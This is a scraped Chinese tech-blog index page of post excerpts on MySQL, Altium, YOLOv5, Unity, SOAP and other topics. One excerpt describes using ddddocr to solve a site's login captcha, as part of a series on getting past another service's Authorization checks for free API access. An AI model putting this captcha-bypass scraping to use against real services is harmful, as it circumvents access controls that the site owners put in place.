	<div class="content list__excerpt post__content clearfix">
		索引是 MySQL 数据库中优化查询性能的重要工具，通过对查询条件和表数据的索引，MySQL可以快速定位数据，提高查询效率。但是，在实际的数据库开发和维护中，我们经常会遇到一些情况，导致索引失效，从而使得查询变得非常缓慢，甚至无法使用索引来优化查询，这会严重影响系统的性能。那么，是什么原因导致了索引失效呢？
常见的情况有：
索引中断数据类型不匹配查询条件使用函数操作前模糊查询OR 查询建立索引时使用函数索引区分度不高 下面我通过实际的例子来具体说说。假设现在我们有一张人物表，建表语句如下：
CREATE TABLE `person` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `name` varchar(64) NOT NULL, `score` int(11) NOT NULL, `age` int(11) NOT NULL, `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4; 1、联合索引中断 在使用联合索引进行查询时，如果联合索引中的某一个列出现了索引中断的情况，那么整个联合索引都会失效，无法继续使用索引来优化查询。
例如：对于联合索引 （name, score），如果条件中如果只有 score，则会导致索引失效。
CREATE INDEX idx_name_score ON person (`name`,`score`); select * from person where score = 90 而下面的情况都会使用索引：
select * from person where name = '31a' select * from person where score = 90 and name = '31a' select * from person where name = '31a' and score = 90 2、数据类型不匹配 如果我们在查询条件中使用了一个不匹配索引的数据类型的值，那么 MySQL 将无法使用该索引来优化查询，从而导致索引失效。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/759c48f1be059ac4e55dfcbb9359e297/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7dc67df9852201b19d9c08756806b44/" rel="bookmark">
			Altium Designer20—版本快速上手及使用技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一、软件下载与安装
二、原理图与PCB库
2.1、库文件的获取
2.1.1、普通方式获取
2.1.2、从原理图中获取
2.1.3、自建库文件（AD中的骚套路）
2.2、添加库文件
三、原理图绘制
3.1、常用的原理图绘制技巧
3.1.1、更改原理图纸张大小
3.1.2、自定义快捷键
3.1.3、原理图中器件翻转
3.1.4、原理图编译屏蔽
3.2、绘制原理图步骤
3.2.1、创建工程
3.2.2、在工程中添加原理图和PCB图
3.2.3、放置元器件
3.2.3、绘制原理图
3.3、原理图生成PCB图
四、PCB图绘制 4.1、常用的PCB绘制技巧
4.2、绘制PCB图
4.2.1、PCB板大小裁剪
4.2.2、PCB设计规则 4.2.3、PCB走线
4.3、检查PCB图
4.4、PCB覆铜 4.5、其他
前言 本文档是本人从AD入门文档，里面有很多使用的技巧与心得。
使用的版本时AD18版以上
一、软件下载与安装 大家可以关注公众号“软件管家”
上面会有软件百度网盘资源链接和安装教程
二、原理图与PCB库 2.1、库文件的获取 2.1.1、普通方式获取 大家可以去淘宝买一个库，一些基础的还是比较全的，本人买的一个库分享大家
链接：https://pan.baidu.com/s/1ENv4TZPTg9JpaqK3afAMUQ 提取码：6666 AD封装库压缩包解压密码是：
shop463601444*taobao-com++
当然有些公司还会有自己的原理图库和PCB库
2.1.2、从原理图中获取 如果你手上有别人的原理图和PBC图，而且你要参考这个原理图和PCB图绘制，如果你直接粘贴幅值，那么你绘制的原理图将会没有相应对应的PCB库文件。这里接需要获取别人原理图和PCB图中元器件使用到的库。
首先、打开别人的原理图库或者PCB库，点击设计
里面会有生成原理图库和PCB图库 下图是生成的原理图及PCB库文件，点击保存
2.1.3、自建库文件（AD中的骚套路） 传统的自己建立库太费劲了，预期有时间不如找找方法。
在18年之前都是找淘宝找器件手册，查看参数自己绘制原理图及PBC图库，这样找芯片找手册会麻烦而且绘制的时候有些参数不知道自己量又会出错。近几年兴起的嘉立创EDA商城和嘉立创EDA在线工具极大方便了开发者，但是其有些兼容性做的并不是特别好，但是由于EDA工具与嘉立创商城是联通的，其找器件的封装和库都非常全，解决了AD找器件的封装的难点，所以最近几年极受欢迎，主要是免费。
如和将嘉立创EDA查找器件的优势用到AD上？骚套路开始
首先，在嘉立创商城上查找到你想要的芯片 点进去后，点击下载文件
会弹出一个界面，点击立即使用，会应用到嘉立创的在线EDA工具中
点击文件导出就可以导出原理图和PCB图 然后使用2.1.2的方法将原理图和PCB图转换成库，就可以将其复制到你要建立的封装库中。 2.2、添加库文件 界面图：如果一不小心关了可以调出1按钮选择Components可以调出库的界面。点击2的以一个选项，可以打开添加库的界面。
按照顺序可以打开相应的库。
点击下拉可以查看相应的库封装
三、原理图绘制 3.1、常用的原理图绘制技巧 3.1.1、更改原理图纸张大小 点击右下角Panels面板，选择Properties面板属性，打开Formatting and Size里面有纸张大小。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7dc67df9852201b19d9c08756806b44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f270d1fa0a2caad776621de136da376e/" rel="bookmark">
			群晖桌面能联网,套件却连不上网的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一般都是dns设置的问题,可以进控制面板-外部访问-路由器配置-设置路由器进行检测,如图左边是有问题的,右边是正常网络访问的
然后点击网络,取消勾选手动配置dns服务器,应用即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a68fd55d492d767b6b892a802be582d/" rel="bookmark">
			实施推荐系统过程中遇到的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 推荐系统本身很成熟，但是在落地过程当中，仍然会有很多困难。通过经历几个大型推荐系统项目，总结一些经验，帮助大家避坑。
01推荐系统的技术架构 推荐系统模块一般如上图所示，先通过召回模块，将候选集召回，然后经过粗排、精排、重排等排序方式，将排序靠前的候选集推送给用户。
02 数据源 1. 埋点
💬 个人观点：
埋点不难，用埋点的数据构造样本比较难，特别是实时社交比如直播。
理想的样本：
用用户id把用户所有行为串起来；可以回溯用户过去看直播间的行为，比如评论、打赏等。 实际上面临的困难：
埋点的数据不准确，是脏数据；埋点数据排查困难：前端代码工程复杂，很容易出问题。但是前端的同学的主要工作也不是数据上报，所以数据出了问题，也不会实时排查，非常容易导致数据脏；回溯模型也很复杂；非常耗资源。 综上，将用户对应的行为，拼成样本，需要花费很多精力。
2. 用户画像
包括用户的基础画像和兴趣画像。兴趣画像来源于两个部分：用户的离线画像、用户的实时画像。其中，离线画像又分为长期离线画像、中期离线画像、短期离线画像。
3. 内容结构化
根据内容信息的不同，内容结构化方式不同，比如电商领域，内容为商品，商品的结构化信息包括分类、品牌、价格、规格等。
💬 个人****观点：
多模态要是应用到推荐系统来，是个难点。
耗费资源：图片转化为向量，信息量太大，计算起来太耗资源。现有的电商算法大多基于行为做描述，而多模态从内容上对商品做描述，怎么结合到一起，需要考虑。 所以目前多模态性价比不高，讨论较多，但是用的较少。
03 特征 特征工程，将结构化的信息转换成模型支持的数据格式。
特征选取的优劣，会最终影响到用户体验。所以特征工程及特征组合的自动化，一直是推动实用化推荐系统技术演进最主要的方向之一。
1. 特征内容
2. 特征生成
💬 个人观点：
（1）特征生成过程有什么难点？
样本拼接：在特征生成过程中，样本拼接也比较难。一些脏数据的识别。如2.1埋点所说，埋点的数据很容易出问题，数据清洗和处理非常耗精力。 （2）有什么热门的特征提取方式？
用Embedding（可以理解为稠密向量）进行特征交叉。
（3）特征工程的趋势：
序列特征：用户历史的行为、浏览行为、点击行为，过去看的直播间、视频，前提就是比较基础的特征做好了上下文特征Embedding （4）用在召回的特征提取，和用在排序的特征提取，有什么不同？
① 特征有差别：
召回模型大多是双塔模型，用户、商品用双塔模型召回，没有交叉特征精排需要交叉特征，比如用户和物品的交叉、属性的交叉等 ② 样本有差异：
召回面向全量精排面对的是召回后的候选集 ③ 做召回的时候，要考虑精准性和效率，精排要用到所有考虑到的特征。所以召回特征是精排特征的子集。
（5）特征抽取：
特征需要结合业务场景去抽取特征，每个场景涉及的都不一样。要涉及到对推荐场景有一个很深的认知，才能抽到好的特征。因为每个场景输入的维度不同。推荐涉及人货场三个方面的特征。有了基础特征之后，就做特征交叉，人货场中任意两三者去做交叉。目前专家所在的大厂某业务，是一个大模型，所有的行业的输入都是同源的。专家认为这是不合理的，所以他认为趋势是，分行业去挖掘特征，每个行业做小的特征，而不是所有行业用一套特征。 04 召回 从全量信息集合中触发尽可能多的正确结果，并将结果返回给排序模块。
💬 个人观点：
数据决定模型的上限。召回决定了推荐的上限，因为精排的候选集是召回出来的。
1. 召回的要点
处理数据量大速度要够快模型不能太复杂使用较少特征 2. 召回的难点
召回怎么样和后链路做一个耦合的学习。会有一种情况，排序很适合之前召回算法的商品，排序的非常好，换了召回算法，出一批新的商品，排序算法就不一定排的很好。评估离线指标和线上指标的一致性：这是基础工作，因为离线评估指标涨了，线上不一定也涨了。指标主要看Hit rate。 注：Hit rate,在top-K推荐中，HR是一种常用的衡量召回率的指标.分母是所有的测试集合，分子是每个用户top-K推荐列表中属于测试集合的个数的总和。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a68fd55d492d767b6b892a802be582d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3272b413eb762c78b74f286206b3522a/" rel="bookmark">
			OSG打印错误Warning: detected OpenGL error ‘invalid operation‘ at after RenderBin::draw(..)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		出现这个错误的原因主要是设置了opengl识别不了的uniform导致。比灯光，深度测试等等，关闭这些uniform可以消除这个错误。否则就得自己定义uniform，不要使用osg自带的uniform字段。
关闭打印
#include &lt;osg\State&gt; osg::setNotifyLevel(osg::NotifySeverity::ALWAYS); 转发自：https://www.cnblogs.com/lyggqm/p/14558219.html
出现错误的地方；
转发自：https://blog.csdn.net/hankern/article/details/112552654
osg/Viewport.cpp void Viewport::apply(State&amp;) const { glViewport( static_cast&lt;GLint&gt;(_x),static_cast&lt;GLint&gt;(_y), static_cast&lt;GLsizei&gt;(_width),static_cast&lt;GLsizei&gt;(_height) ); } osg/State enum CheckForGLErrors { /** NEVER_CHECK_GL_ERRORS hints that OpenGL need not be checked for, this is the fastest option since checking for errors does incur a small overhead.*/ NEVER_CHECK_GL_ERRORS, /** ONCE_PER_FRAME means that OpenGL errors will be checked for once per frame, the overhead is still small, but at least OpenGL errors that are occurring will be caught, the reporting isn't fine grained enough for debugging purposes.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3272b413eb762c78b74f286206b3522a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25833f6e6527cd3d878c800bfe47f9ec/" rel="bookmark">
			SQL Server 高可用方案介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图1
图2
图3
图4
图5
图6
图7
图8
图9
图10
图11
图12
图13
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aaa5954b72ea7cb45e2fc0633d1cb6ef/" rel="bookmark">
			YOLOv5实现佩戴安全帽检测和识别(含佩戴安全帽数据集&#43;训练代码)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		YOLOv5实现佩戴安全帽检测和识别(含佩戴安全帽数据集+训练代码) 目录
YOLOv5实现佩戴安全帽检测和识别(含佩戴安全帽数据集+训练代码)
1. 前言
2. 佩戴安全帽检测和识别的方法
（1）基于目标检测的佩戴安全帽识别方法
（2）基于头部检测+佩戴安全帽分类识别方法
3. 佩戴安全帽数据集说明
（1）佩戴安全帽数据集
（2）自定义数据集
4. 基于YOLOv5的佩戴安全帽模型训练
（1）YOLOv5安装
（2）准备Train和Test数据
（3）配置数据文件
（4）配置模型文件
（5）重新聚类Anchor（可选）
（6）开始训练
（7）可视化训练过程
（8）常见的错误
5. Python版本佩戴安全帽检测效果
6. Android版本佩戴安全帽检测效果（即将发布）
7.项目源码下载
1. 前言 安全帽是作业场所作业时头部防护所用的头部防护用品，它对使用者的头部在受坠落物或小型飞溅物体等其他因素引起的伤害起到防护作用。近年来，因不佩戴安全帽、不规范佩戴安全帽等原因导致的安全生产事故屡禁不止，事故发生背后的影响是巨大的，不仅为家人带来巨大的伤痛，也为企业的利益带来巨大的损失。而如何使员工规范佩戴安全帽、保障员工和企业双方利益，成为了一直以来各方坚持不懈想要实现的目标。因此，研究佩戴安全帽的监测算法，具有重大的意义和广泛的应用价值。
本篇博客，将手把手教你搭建一个基于YOLOv5的佩戴安全帽目标检测识别方法。目前，基于YOLOv5s的目标检测的佩戴安全帽识别方法的平均精度平均值mAP_0.5=0.93，mAP_0.5:0.95=0.63，基本满足业务的性能需求。
另外，为了能部署在手机Android平台上，本人对YOLOv5s进行了模型轻量化，开发了一个轻量级的版本yolov5s05_416和yolov5s05_320，在普通Android手机上可以达到实时的检测和识别效果，CPU(4线程)约30ms左右，GPU约25ms左右 ，基本满足业务的性能需求。
先展示一下Python版本佩戴安全帽检测和识别Demo效果（head表示(头部)未佩戴安全帽，helmet表示佩戴了安全帽）：
【源码下载】 YOLOv5实现佩戴安全帽检测和识别(含佩戴安全帽数据集+训练代码)
【尊重原创，转载请注明出处】https://blog.csdn.net/guyuealian/article/details/127250780
还有Android版本的佩戴安全帽检测效果：
2. 佩戴安全帽检测和识别的方法 （1）基于目标检测的佩戴安全帽识别方法 基于目标检测的佩戴安全帽识别方法，一步到位，把佩戴安全帽类别直接当成多个目标检测的类别进行训练。
该方案采用one-stage的方法，直接端到端训练，任务简单，速度较快；新增类别或者数据，需要人工拉框标注佩戴安全帽的框，成本较大部署简单 （2）基于头部检测+佩戴安全帽分类识别方法 该方法，先训练一个通用的头部检测模型(不区分是否佩戴安全帽)，然后外扩检测框并裁剪头部区域，再训练一个佩戴安全帽分类器，完成对佩戴安全帽的分类识别。当然一个更加简单的方法是，可以将人脸检测器当做头部检测器，即将人脸检测框外扩2倍左右，作为头部检测框的区域。只是这样做，若人背向，人脸检测器一般效果比较差，无法识别是否佩戴了安全帽。
该方案采用two-stage方法，可针对性分别提高检测模型和分类模型的性能头部检测模型不区分是否佩戴安全帽，只检测头部检测框，检测精度较高，佩戴安全帽分类模型可以做到很轻量由于采用two-stage方法进行检测-识别，因此速度相对较慢 考虑到佩戴安全帽检测和识别的任务比较简单，因此本博客将采用“基于目标检测的佩戴安全帽识别方法”。目标检测的的方法较多，比如Faster-RCNN，YOLO系列，SSD等均可以采用，本博客将采用YOLOv5进行佩戴安全帽目标检测模型训练。
3. 佩戴安全帽数据集说明 （1）佩戴安全帽数据集 目前收集了2W+的佩戴安全帽数据集：
Helmet-Asian亚洲人佩戴安全帽数据集：总共有19000+图片，VOC的XML数据格式，可直接用于目标检测模型训练。Helmet-Europe欧洲人佩戴安全帽数据集：总共有3000+图片，VOC的XML数据格式，可直接用于目标检测模型训练。 关于佩戴安全帽数据集说明，详见另一篇博客说明：佩戴安全帽数据集使用说明和下载_PKing666666的博客-CSDN博客
（2）自定义数据集 如果需要增/删类别数据进行训练，或者需要自定数据集进行训练，可参考如下步骤：
采集图片，建议不少于200张图片使用Labelme等标注工具，对目标进行拉框标注：labelme工具：GitHub - wkentaro/labelme: Image Polygonal Annotation with Python (polygon, rectangle, circle, line, point and image-level flag annotation).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aaa5954b72ea7cb45e2fc0633d1cb6ef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1007ed258768f88b28aa88be5f0c431/" rel="bookmark">
			阿里云物联网平台使用指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、进入阿里云 阿里云-计算，为了无法计算的价值 (aliyun.com)
二、注册登陆 登陆后：
首次进入需要创建公共实例，需要等几分钟：
创建实例后进入：
创建产品：
根据自己情况填入产品配置信息，本人主要用于NBIOT通信：
创建产品成功后，可点击管理设备 点击查看（此页面中有重要信息，可用于连接以及平台API的调用，不要泄露！！！）：
点击查看--&gt;功能定义
根据自己的需求设置自定义功能，需要注意两点，一是标识符，用于数据上传的标识，二是读写类型，如果涉及到传感器数据上报等，选择读写选项： TOPIC类列表（建议了解一下MQTT协议）：
完成以上操作后，便完成了通过通讯模块数据上报到该平台的平台准备工作，后续将讲解实现通过NBIOT通信模块BC20将GPS模块上传到该平台中的示例，敬请期待。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aed75c2127791caf747027f947574946/" rel="bookmark">
			MySQL学习总结{ 视图概述、视图管理（创建、查看、修改、删除）、视图数据操作（添加、修改、删除、）}
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、视图概述
1、简化查询语句
2、安全性
3、逻辑数据独立性
二、视图管理
1、创建视图
（1）基于单表创建视图
（2）基于多表创建视图
2、查看视图
（1）查看视图的字段信息
（2）查看视图的状态信息
（3）查看视图的创建语句
3、修改视图
（1）使用CREATE OR REPLACE VIEW 语句修改视图
（2）使用ALTER 语句修改视图
4、删除视图
三、视图数据操作
1、添加数据
2、修改数据
3、删除数据
学习MySQL的视图概述、视图管理（创建、查看、修改、删除）、视图数据操作（添加、修改、删除、）
一、视图概述 1、简化查询语句 视图不仅可以简化用户对数据的理解，也可以简化对数据的操作。例如，日常开发需要经常使用一个比较复杂的语句进行查询，此时就可以将该查询语句定义为视图，从而避免大量重复且复杂的操作。
2、安全性 数据库授权命令可以将每个用户对数据库的检索限制到特定的数据库对象上，但不能授权到数据库特定行和特定列上。通过视图，可以更加方便地进行权限控制，使特定用户只能查询和修改指定的数据，而无法查看和修改数据库中的其他数据。
3、逻辑数据独立性 视图可以帮助用户屏蔽数据表结构变化带来的影响，例如，数据表增加字段不会影
响基于该数据表查询出数据的视图。
二、视图管理 1、创建视图 在MySQL中，可以使用CREATE VIEW 语句创建视图。
创建视图的基本语法格式
​CREATE [ OR REPLACE ] VIEW 视图名 [(字段列表)] AS select_statement ; [OR REPLACE]：可选参数，表示若数据库中已经存在这个名称的视图就替换原有的视图，若不存在则创建视图。视图名：表示要创建的视图名称，该名称在数据库中必须是唯一的，不能与其他数据表或视图同名。select_statement：指一个完整的SELECT语句，表示从某个数据表或视图中查出满足条件的记录，将这些记录导入视图中。一般将SELECT语句所涉及的数据表称为视图的基本表。 视图的基本表可以是一张数据表，也可以是多张数据表。
（1）基于单表创建视图 例如，公司想要组建一个开发小组，开发一个资源管理系统，供各部门上传共享资源。该系统需要根据员工工号empno、员工姓名ename、职位job和部门编号deptno进行账户管理和权限授、予。如果将操作员工表的权限直接交给该开发小组，会造成部分敏感信息泄露。此时数据库管理员可以将员工工号empno、员工姓名ename、职位job和部门编号deptno查询出来创建视view_emp，供该开发小组使用。
示例：将员工工号empno、员工姓名ename、职位job和部门编号deptno查询出来创建视view_emp
通过SELECT 语句查看view_emp视图
从执行结果可以看出，创建的视图view_emp的字段名称和数据表emp的字段名称是一样的。
视图的字段名称可以使用基本表的字段名称，但也可以根据实际的需求自定义视图字段的名称。例如，数据库管理员觉得将数据表的真实字段名称在视图中暴露不太安全，想要创建一个新的视图view_emp2给开发小组使用。视图view_emp2中包含的字段和视图view_emp相同，但视图view_emp2中的字段名称和员工表中的字段名称不一致。
示例：视图view_emp2中包含的字段和视图view_emp相同，但视图view_emp2中的字段名称和员工表中的字段名称不一致
通过SELECT 语句查看view_emp2视图
从执行结果可以看出，虽然view_emp和view_emp2两个视图中的字段名称不同，但是数据却是相同的，这是因为这两个视图引用的是同一个数据表中的数据。在实际开发中，用户可以根据自己的需要，通过视图获取基本表中需要的数据，这样既能满足用户的需求，也不需要破坏基本表原来的结构，从而保证了基本表中数据的安全性。
（2）基于多表创建视图 在MySQL中，除了可以在单表上创建视图，还可以在两个或两个以上的数据表上创建视图。
例如，经过会议研讨，开发小组开发资源管理系统时，需要使用公司ems数据库中员工编号empno、员工姓名ename、职位job、部门编号 deptno和部门名称dname的信息。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aed75c2127791caf747027f947574946/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d3f5f3bbbf7f57d4897bb35ff5d2d95/" rel="bookmark">
			【Python爬虫项目实战三】Ddddocr识别Ocr过开放猫验证码（接Authorization认证更新）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 🍇前言🍍验证码识别的几个方法🥥百度AI开放平台🥥Ddddocr🦑分析验证码位数🦑获取验证码接口🦑算法识别匹配🦑请求登陆接口 🍋总结： 🍇前言 本篇文章接《获取Chatgpt3.5免费接口文末付代码（过Authorization认证）》，由于上次更新了代码后，对方做了验证，而且验证码有点难识别，真人都有点难看明白，喜欢爬虫类文章的可以订阅我专栏哦
⭐⭐欢迎订阅⭐⭐ ⭐⭐欢迎订阅⭐⭐
🚀Python爬虫项目实战系列文章！！
⭐⭐欢迎订阅⭐⭐ ⭐⭐欢迎订阅⭐⭐
例如：
🚀Python爬虫项目实战系列文章！！
⭐⭐欢迎订阅⭐⭐
【Python爬虫项目实战一】获取Chatgpt3.5免费接口文末付代码（过Authorization认证）
【Python爬虫项目实战二】Chatgpt还原验证算法-解密某宝伪知网数据接口
⭐⭐欢迎订阅⭐⭐
🍍验证码识别的几个方法 🥥百度AI开放平台 在对接之前，我们先看一下识别效果，可见效果一般，存在个别识别不出来，又因为需要付费于是不考虑
🥥Ddddocr 之前在其他项目中，已经介绍过了Dddocr，可以参考我的文章
《Selenium验证码ddddocr识别：带带ddocr》
识别验证码，5行搞定
ocr = ddddocr.DdddOcr() with open('image.jpg', 'rb') as f: img_bytes = f.read() res = ocr.classification(img_bytes) print(res) 效果和百度一样遇到几个畸形的就直接识别出错，可以看看我的截图
{"msg":"操作成功","img":"","code":200,"captchaEnabled":true,"uuid":"d14f1de7a0b842cfae525f3389d00f86"} 识别结果：9t67 提取结果：9t6 字符串中不包含 +、-、* 或 / 符号 {"msg":"操作成功","img":"","code":200,"captchaEnabled":true,"uuid":"010ed8010fe241c9a8c2e8c0989f9084"} 识别结果：4j4e7 4j4 字符串中不包含 +、-、* 或 / 符号 {"msg":"操作成功","img":"","code":200,"captchaEnabled":true,"uuid":"623dd34830554da49911b2ae75507921"} 识别结果：3t03 3t0 字符串中不包含 +、-、* 或 / 符号 {"msg":"操作成功","img":"","code":200,"captchaEnabled":true,"uuid":"164524dd70e74ae18d3782d7887b8974"} 识别结果：1*37 提取结果：1*3 字符串中包含 +、-、* 或 / 符号 之前识别发现效果不理想，但是在验证码中，存在简单的验证码随机刷新，所以我的做法是：舍弃百度AI通过Ddddocr识别，识别过程中判断"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d3f5f3bbbf7f57d4897bb35ff5d2d95/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f7fb698fca636085dd4cb5dacb77697/" rel="bookmark">
			[Android Studio] 如何修改 Flamingo 之后版本的 Gradle JDK 位置列表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本博客站点已全量迁移至 DevDengChao 的博客 https://blog.dengchao.fun , 后续的新内容将优先在自建博客站进行发布, 欢迎大家访问.
文章目录 前言正文相关内容推广 前言 前一段时间在调试项目使用的 JDK 时不小心将同一个位置的 JDK 多次添加到了 Gradle JDK 列表中, 导致这个列表中出现了多个相同的 JDK:
突然强迫症犯了, 很难受, 很想删掉一个, 但是到处找都没找到像 IDEA 那样提供的一个 GUI 能直接删除的:
正文 在网上搜了几篇帖子, 都是在讲如何选择/添加 Gradle JDK 的, 没有看到有讲怎么删除的.
不得已, 只能去找 Android Studio 官方的文档看看了.
几番搜索之后找到了 Configure Android Studio https://developer.android.google.cn/studio/intro/studio-config 这篇文档, 其中介绍到各个操作系统下配置文件的路径:
照着文档上介绍的路径, 我很快就找到了自己现在用的 Android Studio 版本的配置文件的文件夹:
文件夹里的内容不多, 从文件名大概也能看出我想找的 Gradle JDK 列表应该是在 options 文件夹里.
果然在 options 里找到了 jdk.table.xml 文件, 打开一看, 正是我想要的内容:
把不需要的 &lt;jdk&gt; 标签删除并保存, 回到 Android Studio 里一看, 果然也同步消失了.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f7fb698fca636085dd4cb5dacb77697/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3fd2bef0c3e79c0e1b8c06613f3a1592/" rel="bookmark">
			Unity --- UGUI --- Rect Transform(矩形变换) --- 锚点及其相关应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.所有的UI物体都没有Transform组件，取而代之的是Transform组件的派生 --- Rect Transform(矩形变换)
2.Rect Transform和Transform一样都有旋转和缩放，它两之间的区别是：
Rect Transform多了：a.Pibot轴心点；b.Anchors 锚点；c.宽度，高度和略加改变后的x,y,z
3.Pos x ,Pos y , Pos z 这三个值所表示的是UI物体的轴心点相对于锚点的坐标
1.将上面这个Center改为Pivot就可以移动UI物体的轴心点了
2.UI物体的轴心点就是上图中的那个蓝色空心圆圈，这个点的坐标就是UI的具体位置，且UI物体的旋转是绕着轴心点旋转的，同时UI物体的长宽也是相对于轴心点扩大的
比如说长由100变为200，且轴心点在UI物体中心的话，则UI物体左右长度各增加50（宽同理，轴心点在其它位置同理）
3.轴心点的坐标由Rect Transform组件中的Pivot属性来表示 ---
a.轴心点的坐标是通过比例来显示的
b.当一个UI物体的轴心点的坐标为（0，0）的时候，轴心点位于UI物体的左下角，为（1，1）的时候就是右上角（PS：轴心点坐标的两个值X,Y的取值范围可以大于1，也可以小于0） 1.接下来开始介绍Image组件
Image UI 物体 --- 显示图片的UI物体 --- 其有一个关键的组件 --- Image组件 ---
Image UI 物体显示的是什么图片取决于Image组件中的 Source Image属性 --- 我们给这个属性传什么图片，UI物体就显示什么图片
2.在Unity中图片的默认类型是 Texture（纹理） --- 而UI需要的图片类型是 Spirit（精灵）
1.上图是一张图片的Inspector面板，在这个面板中我们可以通过修改 Testure Type来修改图片的类型
目前我们要将其改为：Spirit精灵类型（PS：选完之后记得点右下角的Apply应用）
1.创建一个UI物体后，这个UI物体会带着上图这四个小三角 --- 这四个小三角就是UI物体的锚点（Anchors）
2.一个UI物体的四个角与其锚点对应的四个角之间的相对位置不发生改变（除非我们手动调） --- 也就是说如果我们改变锚点的位置，为了保证相对位置不发生改变，UI图像的位置也要跟着变
3.锚点与屏幕的相对位置不发生改变（除非我们调）--- 例如锚点本来在屏幕的右上角，当屏幕扩大后，锚点要保持相对位置不变，会移动到变化后的屏幕的右上角
1.常用的锚点位置就是上图圈起来的九个地方
2.锚点的四个小三角形是能够分开的哦，每个小三角形都对应着UI物体四边中的一个角（PS：每个角与屏幕的相对位置要保持不变）
3.如果不将锚点的小三角形分开的话 --- 我们能够实现的是位置自适应；如果将锚点分开的话，我们能够实现的就是大小自适应
1.锚点，轴心点和UI物体的位置的设置方法有两种：
一种是我们在场景中手动调
另一种就是直接设置Unity给我们提供的现成的模板即可 --- 模板的位置在UI物体的Inspector面板处的Rect Transform组件的左上角那个框框
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3fd2bef0c3e79c0e1b8c06613f3a1592/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd2a68f36ab8ccf2716359ceca8adff6/" rel="bookmark">
			【SOAP-WebService系列】SOAP学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、SOAP是什么？
2、SOAP特性
3、SOAP消息组成
4、SOAP调用
5、SOAP和HTTP
1、SOAP是什么？ SOAP(Simple Object Access Protocol，即简单对象访问协议) ，是一个轻量级协议，用于在分散的分布式环境中使用XML在对等体之间交换结构化和类型化的信息。或者更简单地说：SOAP是一个基于XML的通信协议(SOAP被认为是第二代XML协议，第一代具有代表性的技术叫XML-RPC)。
SOAP使用XML数据格式，以描述调用的远程接口、参数、返回值和出错信息等等。它可以基于多种传输协议来传递消息(HTTP/HTTPS、SMTP、TCP、UDP等)。
2、SOAP特性 1. SOAP是一种轻量级通信协议
2. 用于应用程序之间的通信
3. 使用SOAP的应用使用HTTP协议通信
4. 独立于平台
5. 独立于编程语言
6. 基于XML
7. 很简单并可扩展
8. 允许绕过防火墙
3、SOAP消息组成 由四部分组成：
（1） SOAP信封（Envelope）：定义了一个框架，框架描述了消息中的内容是什么，包括消息的内容、发送者、接收者、处理者以及如何处理消息。
（2）SOAP编码规则：定义了一种系列化机制，用于交换应用程序所定义的数据类型的实例。
（3） SOAP RPC表示：定义了用于表示远程过程调用和应答协定。
（4）SOAP绑定：定义了一种使用底层传输协议来完成在节点间交换SOAP信封的约定。
4、SOAP调用 soap的调用过程：
